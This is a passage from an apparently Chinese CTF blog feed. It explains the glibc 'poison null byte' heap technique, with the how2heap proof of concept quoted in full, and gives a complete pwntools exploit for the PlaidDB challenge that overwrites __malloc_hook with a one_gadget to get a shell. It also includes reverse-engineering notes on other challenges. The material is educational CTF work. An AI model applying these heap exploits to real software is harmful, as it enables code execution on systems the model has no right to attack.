s.model()<br>id_ = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    id_ += <span class="hljs-built_in">chr</span>(res[fuckId[i]].as_long())<br>print(id_)<br></code></pre></td></tr></table></figure><p>最后组合得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;挂科CTF-KillerAid&quot;&gt;&lt;a href=&quot;#挂科CTF-KillerAid&quot; class=&quot;headerlink&quot; title=&quot;挂科CTF KillerAid&quot;&gt;&lt;/a&gt;挂科CTF KillerAid&lt;/h1&gt;&lt;p&gt;题目下载: &lt;a href=&quot;/20</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="Reverse" scheme="https://panda0s.top/tags/Reverse/"/>
    
    <category term="AES" scheme="https://panda0s.top/tags/AES/"/>
    
    <category term="AntiDebug" scheme="https://panda0s.top/tags/AntiDebug/"/>
    
  </entry>
  
  <entry>
    <title>poison null byte</title>
    <link href="https://panda0s.top/2021/06/23/poison-null-byte/"/>
    <id>https://panda0s.top/2021/06/23/poison-null-byte/</id>
    <published>2021-06-23T01:56:48.000Z</published>
    <updated>2021-06-23T02:53:19.031Z</updated>
    
    <content type="html"><![CDATA[<h1 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison null byte"></a>poison null byte</h1><p>off by null 改小已经释放的 chunk 的 size 域，而该 chunk 的物理下一个 chunk 的 prev_size 域没有被修改。</p><p>当前 chunk 的 size 域被改小，意味着定位下一个 chunk 会出问题，无法正确修改原来物理相邻 chunk 的 prev_size 域，释放原来物理相邻 chunk ，利用合并机制产生堆叠。</p><img src="/2021/06/23/poison-null-byte/image-20210623103530164.png" class="" title="image-20210623103530164"><p>如图 chunk a 存在 off by null ，释放 chunk b 并利用 off by null 修改 chunk b 的 size 域为 0x100</p><img src="/2021/06/23/poison-null-byte/image-20210623103811398.png" class="" title="image-20210623103811398"><p>现在，chunk b 已经被修改成 0x100 大小的 chunk，并且 chunk b 在 unsorted bin 中。</p><p>接下来在 chunk b 中分配两个 chunk 分别是： chunkB1 与 chunkB2，释放 chunkB1，最后释放 chunk c。</p><p>释放 chunk c 时，chunkB1 越过 chunk B2 与 chunk c 合并成一个大 chunk，分配出该大 chunk 产生 chunk B2 重叠的 chunk。</p><p>注意 chunkB1 不能在 fastbin 中（接下来用于绕过 free(chunk c) 时的 unlink 验证）</p><p>注意 chunk b 我们要绕过一个限制：chunksize(P) != prev_size (next_chunk(P))</p><p>chunk b 的 size 被修改成 0x100，prev_size (next_chunk(chunk b)) 也要修改为 0x100</p><p>how2heap 的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Welcome to poison null byte 2.0!\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tested in Ubuntu 16.04 64bit.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique only works with disabled tcache-option for glibc, see build_glibc.sh for build instructions.\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);<br><br><span class="hljs-keyword">uint8_t</span>* a;<br><span class="hljs-keyword">uint8_t</span>* b;<br><span class="hljs-keyword">uint8_t</span>* c;<br><span class="hljs-keyword">uint8_t</span>* b1;<br><span class="hljs-keyword">uint8_t</span>* b2;<br><span class="hljs-keyword">uint8_t</span>* d;<br><span class="hljs-keyword">void</span> *barrier;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate 0x100 bytes for &#x27;a&#x27;.\n&quot;</span>);<br>a = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a: %p\n&quot;</span>, a);<br><span class="hljs-keyword">int</span> real_a_size = malloc_usable_size(a);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Since we want to overflow &#x27;a&#x27;, we need to know the &#x27;real&#x27; size of &#x27;a&#x27; &quot;</span><br><span class="hljs-string">&quot;(it may be more than 0x100 because of rounding): %#x\n&quot;</span>, real_a_size);<br><br><span class="hljs-comment">/* chunk size attribute cannot have a least significant byte with a value of 0x00.</span><br><span class="hljs-comment"> * the least significant byte of this will be 0x10, because the size of the chunk includes</span><br><span class="hljs-comment"> * the amount requested plus some amount required for the metadata. */</span><br>b = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b: %p\n&quot;</span>, b);<br><br>c = (<span class="hljs-keyword">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c: %p\n&quot;</span>, c);<br><br>barrier =  <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.\n&quot;</span><br><span class="hljs-string">&quot;The barrier is not strictly necessary, but makes things less confusing\n&quot;</span>, barrier);<br><br><span class="hljs-keyword">uint64_t</span>* b_size_ptr = (<span class="hljs-keyword">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br><span class="hljs-comment">// added fix for size==prev_size(next_chunk) check in newer versions of glibc</span><br><span class="hljs-comment">// https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30</span><br><span class="hljs-comment">// this added check requires we are allowed to have null pointers in b (not just a c string)</span><br><span class="hljs-comment">//*(size_t*)(b+0x1f0) = 0x200;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In newer versions of glibc we will need to have our updated size inside b itself to pass &quot;</span><br><span class="hljs-string">&quot;the check &#x27;chunksize(P) != prev_size (next_chunk(P))&#x27;\n&quot;</span>);<br><span class="hljs-comment">// we set this location to 0x200 since 0x200 == (0x211 &amp; 0xff00)</span><br><span class="hljs-comment">// which is the value of b.size after its first byte has been overwritten with a NULL byte</span><br>*(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><br><span class="hljs-comment">// this technique works by overwriting the size metadata of a free chunk</span><br><span class="hljs-built_in">free</span>(b);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size is: (0x200 + 0x10) | prev_in_use\n&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We overflow &#x27;a&#x27; with a single null byte into the metadata of &#x27;b&#x27;\n&quot;</span>);<br>a[real_a_size] = <span class="hljs-number">0</span>; <span class="hljs-comment">// &lt;--- THIS IS THE &quot;EXPLOITED BUG&quot;</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);<br><br><span class="hljs-keyword">uint64_t</span>* c_prev_size_ptr = ((<span class="hljs-keyword">uint64_t</span>*)c)<span class="hljs-number">-2</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;c.prev_size is %#lx\n&quot;</span>,*c_prev_size_ptr);<br><br><span class="hljs-comment">// This malloc will result in a call to unlink on the chunk where b was.</span><br><span class="hljs-comment">// The added check (commit id: 17f487b), if not properly handled as we did before,</span><br><span class="hljs-comment">// will detect the heap corruption now.</span><br><span class="hljs-comment">// The check is this: chunksize(P) != prev_size (next_chunk(P)) where</span><br><span class="hljs-comment">// P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)</span><br><span class="hljs-comment">// next_chunk(P) == b-0x10+0x200 == b+0x1f0</span><br><span class="hljs-comment">// prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))\n&quot;</span>,<br>*((<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x8</span>)), *(<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x10</span> + *((<span class="hljs-keyword">size_t</span>*)(b<span class="hljs-number">-0x8</span>))));<br>b1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b1: %p\n&quot;</span>,b1);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we malloc &#x27;b1&#x27;. It will be placed where &#x27;b&#x27; was. &quot;</span><br><span class="hljs-string">&quot;At this point c.prev_size should have been updated, but it was not: %#lx\n&quot;</span>,*c_prev_size_ptr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Interestingly, the updated value of c.prev_size has been written 0x10 bytes &quot;</span><br><span class="hljs-string">&quot;before c.prev_size: %lx\n&quot;</span>,*(((<span class="hljs-keyword">uint64_t</span>*)c)<span class="hljs-number">-4</span>));<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);<br><span class="hljs-comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span><br><br>b2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;b2: %p\n&quot;</span>,b2);<br><br><span class="hljs-built_in">memset</span>(b2,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-number">0x80</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);<br><br><span class="hljs-built_in">free</span>(b1);<br><span class="hljs-built_in">free</span>(c);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finally, we allocate &#x27;d&#x27;, overlapping &#x27;b2&#x27;.\n&quot;</span>);<br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;d: %p\n&quot;</span>,d);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Now &#x27;d&#x27; and &#x27;b2&#x27; overlap.\n&quot;</span>);<br><span class="hljs-built_in">memset</span>(d,<span class="hljs-string">&#x27;D&#x27;</span>,<span class="hljs-number">0x300</span>);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;New b2 content:\n%s\n&quot;</span>,b2);<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Thanks to https://www.contextis.com/resources/white-papers/glibc-adventures-the-forgotten-chunks&quot;</span><br><span class="hljs-string">&quot;for the clear explanation of this technique.\n&quot;</span>);<br><br>assert(<span class="hljs-built_in">strstr</span>(b2, <span class="hljs-string">&quot;DDDDDDDDDDDD&quot;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="PlaidDB"><a href="#PlaidDB" class="headerlink" title="PlaidDB"></a>PlaidDB</h2><p>利用 poison null byte ，泄漏libc地址，构造 fake fastbin 到 __malloc_hook - 0x23</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/2.23/64/lib/libc-2.23.so&#x27;</span><br>ld_file_name = <span class="hljs-string">&#x27;/home/pandaos/Projects/pwn/glibc/buu/ubuntu16/ld-linux-x86-64.so.2&#x27;</span><br><br>targetBin = <span class="hljs-string">&#x27;./datastore&#x27;</span><br>elf = ELF(targetBin)<br>libc = ELF(libc_file_name)<br><br>p = process([ld_file_name, targetBin],<br>    env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>: libc_file_name&#125;)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">GET</span>(<span class="hljs-params">key</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter command:\n&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter row key:\n&#x27;</span>, key)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">PUT</span>(<span class="hljs-params">key, size, value</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter command:\n&#x27;</span>, <span class="hljs-string">&#x27;PUT&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter row key:\n&#x27;</span>, key)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter data size:\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Enter data:\n&#x27;</span>, value)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">DEL</span>(<span class="hljs-params">key</span>):</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter command:\n&#x27;</span>, <span class="hljs-string">&#x27;DEL&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter row key:\n&#x27;</span>, key)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">DUMP</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter command:\n&#x27;</span>, <span class="hljs-string">&#x27;DUMP&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">EXIT</span>():</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;Enter command:\n&#x27;</span>, <span class="hljs-string">&#x27;EXIT&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    PUT(<span class="hljs-built_in">str</span>(i), <span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">8</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    DEL(<span class="hljs-built_in">str</span>(i))<br><br><br>PUT(<span class="hljs-string">&#x27;key1&#x27;</span>, <span class="hljs-number">0x71</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x71</span>)<br>PUT(<span class="hljs-string">&#x27;key2&#x27;</span>, <span class="hljs-number">0x100</span>, (<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">128</span> + p64(<span class="hljs-number">0x90</span>)) + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0x100</span> - <span class="hljs-number">0x88</span>))<br>PUT(<span class="hljs-string">&#x27;key3&#x27;</span>, <span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;C&#x27;</span> * <span class="hljs-number">0x90</span>)<br>PUT(<span class="hljs-string">&#x27;keyD&#x27;</span>, <span class="hljs-number">0x90</span>, <span class="hljs-string">&#x27;D&#x27;</span> * <span class="hljs-number">0x90</span>) <span class="hljs-comment"># top</span><br><br>DEL(<span class="hljs-string">&#x27;key1&#x27;</span>)<br>DEL(<span class="hljs-string">&#x27;key2&#x27;</span>)<br><br>PUT(<span class="hljs-string">&#x27;E&#x27;</span> * <span class="hljs-number">0x78</span>, <span class="hljs-number">0x11</span>, <span class="hljs-string">&#x27;F&#x27;</span> * <span class="hljs-number">0x11</span>)<br><br>PUT(<span class="hljs-string">&#x27;key4&#x27;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;\xAA&#x27;</span> * <span class="hljs-number">0x80</span>)<br>PUT(<span class="hljs-string">&#x27;key5&#x27;</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;\xCC&#x27;</span> * <span class="hljs-number">0x60</span>) <span class="hljs-comment">#hhh</span><br><br><span class="hljs-comment"># overlap</span><br>DEL(<span class="hljs-string">&#x27;key4&#x27;</span>)<br>DEL(<span class="hljs-string">&#x27;key3&#x27;</span>)<br><br><span class="hljs-comment"># leak</span><br>PUT(<span class="hljs-string">&#x27;key6&#x27;</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;\xBB&#x27;</span> * <span class="hljs-number">0x80</span>)<br>GET(<span class="hljs-string">&#x27;key5&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;:\n&quot;</span>)<br>leak_raw = u64(p.recvn(<span class="hljs-number">8</span>))<br>print(<span class="hljs-string">&quot;leak raw:&quot;</span>, <span class="hljs-built_in">hex</span>(leak_raw))<br>libc_base = leak_raw - <span class="hljs-number">0x39bb78</span><br>print(<span class="hljs-string">&quot;leak libc:&quot;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><br><span class="hljs-comment"># one_gadget</span><br>one_gadget = libc_base + <span class="hljs-number">0xd5bf7</span><br>malloc_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>realloc_hook = libc_base + libc.symbols[<span class="hljs-string">&#x27;realloc&#x27;</span>]<br>realloc_off = <span class="hljs-number">0x9</span><br>target_fastbin = malloc_hook - <span class="hljs-number">0x23</span><br><br>print(<span class="hljs-string">&quot;one gadget:&quot;</span>, <span class="hljs-built_in">hex</span>(one_gadget))<br>print(<span class="hljs-string">&quot;relloc_hook:&quot;</span>, <span class="hljs-built_in">hex</span>(realloc_hook))<br>print(<span class="hljs-string">&quot;malloc_hook:&quot;</span>, <span class="hljs-built_in">hex</span>(malloc_hook))<br><br>fake_chunk  = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + <span class="hljs-string">b&#x27;\x99&#x27;</span> * <span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0x20</span>)<br>fake_chunk2 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x80</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x71</span>) + p64(target_fastbin) +<span class="hljs-string">b&#x27;\x99&#x27;</span> * <span class="hljs-number">0x58</span> + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0x20</span>)<br>DEL(<span class="hljs-string">&#x27;key6&#x27;</span>)<br>PUT(<span class="hljs-string">&#x27;key8&#x27;</span>, <span class="hljs-built_in">len</span>(fake_chunk), fake_chunk)<br>DEL(<span class="hljs-string">&#x27;key5&#x27;</span>)<br>DEL(<span class="hljs-string">&#x27;key8&#x27;</span>)<br>PUT(<span class="hljs-string">&#x27;key8&#x27;</span>, <span class="hljs-built_in">len</span>(fake_chunk2), fake_chunk2)<br><span class="hljs-comment"># malloc_hook in fastbin</span><br><span class="hljs-comment"># &#x27;A&#x27; * 0xB, realloc_hook, malloc_hook</span><br>fake_chunk3 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xB</span> + p64(one_gadget) + p64(realloc_hook + realloc_off)<br>PUT(<span class="hljs-string">&#x27;key9&#x27;</span>, <span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">0x60</span>)<br>PUT(<span class="hljs-string">&#x27;key10&#x27;</span>, <span class="hljs-number">0x60</span>, fake_chunk3.ljust(<span class="hljs-number">0x60</span>, <span class="hljs-string">b&#x27;A&#x27;</span>))<br><span class="hljs-comment"># gdb.attach(p, &#x27;b *&#x27; + hex(one_gadget))</span><br>p.sendlineafter(<span class="hljs-string">&#x27;Enter command:\n&#x27;</span>, <span class="hljs-string">&#x27;PUT&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;poison-null-byte&quot;&gt;&lt;a href=&quot;#poison-null-byte&quot; class=&quot;headerlink&quot; title=&quot;poison null byte&quot;&gt;&lt;/a&gt;poison null byte&lt;/h1&gt;&lt;p&gt;off by null 改小</summary>
      
    
    
    
    <category term="CTF" scheme="https://panda0s.top/categories/CTF/"/>
    
    
    <category term="PWN" scheme="https://panda0s.top/tags/PWN/"/>
    
    <category term="heap" scheme="https://panda0s.top/tags/heap/"/>
    
    <category term="overlap" scheme="https://panda0s.top/tags/overlap/"/>
    
    <category term="poison_null_byte" scheme="https://panda0s.top/tags/poison-null-byte/"/>
    
    <category term="off_by_null" scheme="https://panda0s.top/tags/off-by-null/"/>
    
  </entry>
  
  <entry>
    <title>强网杯: unicorn_like_a_pro</title>
    <link href="https://panda0s.top/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/"/>
    <id>https://panda0s.top/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/</id>
    <published>2021-06-14T13:11:36.000Z</published>
    <updated>2021-06-14T12:49:19.429Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强网杯-unicorn-like-a-pro"><a href="#强网杯-unicorn-like-a-pro" class="headerlink" title="强网杯: unicorn_like_a_pro"></a>强网杯: unicorn_like_a_pro</h1><p>unicorn framework 是一个基于 qemu 的模拟执行框架</p><p>GitHub链接: <a href="https://github.com/unicorn-engine/unicorn">https://github.com/unicorn-engine/unicorn</a></p><p>这道题目内部就调用了 unicorn 框架模拟执行一段 x64代码，最开始以为出题人魔改了 unicorn 框架，用 bindiff 分析了一段时间，发现并没有魔改 unicorn 代码</p><p>附件 原题 &amp; 脚本 &amp; idb: <a href="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/unicorn_idb_bin.zip" title="unicorn_idb_bin.zip">unicorn_idb_bin.zip</a></p><h2 id="1-符号还原"><a href="#1-符号还原" class="headerlink" title="1. 符号还原"></a>1. 符号还原</h2><p>本题没有符号，逆向时比较困难，用 bindiff 可以直接还原。</p><p>在 ubuntu 上编译一份 unicorn 代码，载入 bindiff 插件即可完成大部分符号还原。</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210613213557547.png" class="" title="image-20210613213557547"><p>IDA 中的 bindiff 插件，载入另外一份 idb 后，按下 Ctrl + 6, 点击 如下按钮，设置好阀值后即可导入符号</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210613213709484.png" class="" title="image-20210613213709484"><h2 id="2-main-函数分析"><a href="#2-main-函数分析" class="headerlink" title="2. main 函数分析"></a>2. main 函数分析</h2><p>2.1 创建虚拟机</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">uc_open(<span class="hljs-number">4u</span>, <span class="hljs-number">8</span>, &amp;v14);                         <span class="hljs-comment">// UC_ARCH_X86, UC_MODE_64</span><br></code></pre></td></tr></table></figure><p>2.2 复制代码到虚拟机的 0x1000 地址</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uc_mem_write</span>(v<span class="hljs-number">14</span>, <span class="hljs-number">0</span>x<span class="hljs-number">1000</span>LL, &amp;code, <span class="hljs-number">0</span>x<span class="hljs-number">1027</span>LL);<br></code></pre></td></tr></table></figure><p>2.3 设置回调</p><p>Unicorn 